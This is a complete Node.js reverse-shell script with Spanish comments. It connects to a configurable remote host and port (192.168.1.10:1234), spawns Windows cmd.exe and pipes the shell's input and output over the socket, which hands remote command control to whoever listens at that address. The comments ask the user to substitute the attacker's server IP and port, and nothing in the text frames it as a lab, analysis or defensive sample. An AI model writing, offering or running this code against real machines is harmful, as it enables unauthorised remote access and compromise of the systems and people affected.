const net = require('net');
const spawn = require('child_process').spawn;

const REMOTE_HOST = '192.168.1.10'; // Cambia esto por la dirección IP del servidor remoto
const REMOTE_PORT = 1234;           // Cambia esto por el puerto del servidor remoto

const client = new net.Socket();
client.connect(REMOTE_PORT, REMOTE_HOST, () => {
    const shell = spawn('cmd.exe', []);

    client.pipe(shell.stdin);
    shell.stdout.pipe(client);
    shell.stderr.pipe(client);

    shell.on('close', () => {
        client.destroy();
    });
});

client.on('error', (err) => {
    console.error(err);
    client.destroy();
});
